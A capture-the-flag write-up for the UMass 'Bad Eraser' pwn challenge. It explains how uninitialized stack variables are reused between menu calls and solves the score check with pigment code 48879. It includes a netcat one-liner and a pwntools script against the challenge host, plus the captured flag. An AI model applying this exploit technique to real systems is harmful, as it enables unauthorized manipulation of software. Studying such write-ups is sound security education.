# Bad Eraser - UMass CTF Pwn Writeup 

## Challenge

The challenge description was:

> You are helping run the Brick Workshop, where every batch is tested for clutch power before shipping. The diagnostics station claims to require a two-step calibration, but something feels off about how it remembers old mold IDs and pigment codes. Can you use the workshop menu to force a perfect test result and unlock Master Builder status?

Remote:

```text
nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 45002
```

Flag format:

```text
UMASS{...}
```

Files in the challenge folder:

- `bad_eraser`
- `bad_eraser.c`
- `Makefile`
- `Dockerfile`

This was immediately a good sign for a pwn challenge because I had source. That meant I could verify the intended bug quickly instead of wasting time on blind fuzzing.

## First Look

I started by reading the source. The important part of the program was this function:

```c
static void workshop_turn(void) {
    int choice;
    unsigned int mold_id;
    unsigned int pigment_code;

    banner();
    if (scanf("%d", &choice) != 1) {
        exit(0);
    }

    if (choice == 1) {
        preview_brick();
        return;
    }

    if (choice == 2) {
        erase_station();
        return;
    }

    if (choice == 4) {
        puts("Workshop closed. See you next build day.");
        exit(0);
    }

    if (choice != 3) {
        puts("Unknown action. Pick 1-4.");
        return;
    }

    if (!service_initialized) {
        puts("First-time calibration required.");
        puts("Enter mold id and pigment code.");
        if (scanf("%u %u", &mold_id, &pigment_code) != 2) {
            exit(0);
        }

        puts("Calibration saved. Re-enter diagnostics for clutch validation.");
        service_initialized = 1;
        return;
    }

    diagnostics_bay(mold_id, pigment_code);
}
```

At that point the bug was basically already visible.

## The Bug

`mold_id` and `pigment_code` are local stack variables.

They only get initialized in the `!service_initialized` branch:

```c
if (scanf("%u %u", &mold_id, &pigment_code) != 2) {
    exit(0);
}
```

But on the second visit to menu option `3`, the program skips that branch and directly does:

```c
diagnostics_bay(mold_id, pigment_code);
```

That means the second diagnostics run uses uninitialized locals.

In practice, on x86_64 with this build, those stack slots still contain the values from the previous calibration step. So even though the program acts like I need to "save" calibration globally, it actually just reuses stale stack data from the prior call to `workshop_turn()`.

This is not a buffer overflow. It is a use of uninitialized stack memory, and the challenge description was hinting exactly at that:

- "two-step calibration"
- "remembers old mold IDs and pigment codes"

The program is pretending to persist state, but it is really just accidentally reusing old stack contents.

## Why I Expected This To Work Reliably

I still wanted to confirm that the stale values would survive across loop iterations instead of getting clobbered.

The program does:

```c
while (1) {
    workshop_turn();
}
```

Since `workshop_turn()` gets called repeatedly with the same stack frame layout, the compiler reuses the same offsets for:

- `choice`
- `mold_id`
- `pigment_code`

I checked the disassembly and saw exactly that. On the first diagnostics run, `scanf("%u %u", ...)` writes into stack slots corresponding to `mold_id` and `pigment_code`. On the later run, the function loads those same stack slots and passes them into `diagnostics_bay()` without reinitializing them.

So the exploit path is:

1. Choose menu option `3`
2. Supply calibration values once
3. Return to the menu
4. Choose menu option `3` again
5. The program reuses the previous values and evaluates them

That is the whole vulnerability.

## The Win Condition

The diagnostics function was:

```c
static unsigned int clutch_score(unsigned int mold_id, unsigned int pigment_code) {
    return (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1);
}

static void diagnostics_bay(unsigned int mold_id, unsigned int pigment_code) {
    puts("Running clutch-power diagnostics...");
    if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
        win();
    }

    puts("Result: unstable clutch fit. Send batch back to sorting.");
    exit(0);
}
```

So I needed:

```text
(((mold_id >> 2) & 0x43) | pigment_code) + (pigment_code << 1) == 0x23ccd
```

At first glance this looks like I may need to solve for both inputs, but the mask on `mold_id` is tiny:

```text
0x43 = 0b0100_0011
```

So only bits `0`, `1`, and `6` of `(mold_id >> 2)` matter.

Let:

```text
a = ((mold_id >> 2) & 0x43)
p = pigment_code
```

Then the condition becomes:

```text
(a | p) + 2p = 0x23ccd
```

If I pick a `p` where bits `0`, `1`, and `6` are already set, then `(a | p) = p` for every possible `a` in that mask.

That reduces the equation to:

```text
3p = 0x23ccd
```

And:

```text
0x23ccd / 3 = 0xbeef
```

So:

```text
pigment_code = 0xBEEF = 48879
```

Now I only have to check that `0xBEEF` has the relevant low bits set. It does:

- bit 0 = 1
- bit 1 = 1
- bit 6 = 1

That means the `mold_id` value does not matter anymore, because OR-ing any subset of `0x43` into `0xBEEF` leaves it unchanged.

So the winning input is simply:

```text
mold_id = anything
pigment_code = 48879
```

## Local Test

The local binary in my folder did not have execute permission, so I rebuilt from source and tested the intended interaction locally.

Input:

```text
3
0 48879
3
```

Expected behavior:

1. First `3` enters calibration mode
2. `0 48879` gets stored in the local stack variables
3. Second `3` re-enters diagnostics
4. The stale stack values are reused
5. `clutch_score()` hits `0x23ccd`
6. `win()` prints the flag

The local rebuilt binary printed:

```text
Master Builder status unlocked!
flag.txt is missing. Ask an admin to deploy the real flag.
```

That was enough to confirm the exploit path was correct.

## Remote Exploit

The remote solve was just the same three-line interaction:

```bash
printf '3\n0 48879\n3\n' | nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 45002
```

And the service returned:

```text
=== Bad Eraser Brick Workshop ===
1) Preview a custom brick
2) Use eraser tool
3) Enter clutch-power diagnostics
4) Close workshop
> First-time calibration required.
Enter mold id and pigment code.
Calibration saved. Re-enter diagnostics for clutch validation.
=== Bad Eraser Brick Workshop ===
1) Preview a custom brick
2) Use eraser tool
3) Enter clutch-power diagnostics
4) Close workshop
> Running clutch-power diagnostics...
Master Builder status unlocked!
UMASS{brickshop_calibration_reuses_your_last_batch}
```

## Minimal Exploit Script

If I wanted a scripted solve instead of the one-liner, this is enough:

```python
from pwn import *

io = remote("bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org", 45002)

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Enter mold id and pigment code.\n", b"0 48879")
io.sendlineafter(b"> ", b"3")

print(io.recvall().decode())
```

## Why This Challenge Is Nice

I liked this one because it looks like a menu-driven state machine, but the actual state is fake. The bug is not in some dramatic overwrite or control-flow hijack. The trick is just noticing that the second stage reads locals that were only initialized in the first stage.

That also matches the challenge theme very well:

- the service "remembers" old values
- but it does not actually store them safely
- it just accidentally reuses whatever was left on the stack

So the solve is really about recognizing stale stack state, then simplifying the arithmetic enough to make the second input trivial.

## Final Flag

```text
UMASS{brickshop_calibration_reuses_your_last_batch}
```

## Short Version

If I had to summarize the exploit in one sentence:

I entered diagnostics once with `pigment_code = 48879`, then entered diagnostics again so the program reused the old uninitialized stack values and passed the `clutch_score()` check.
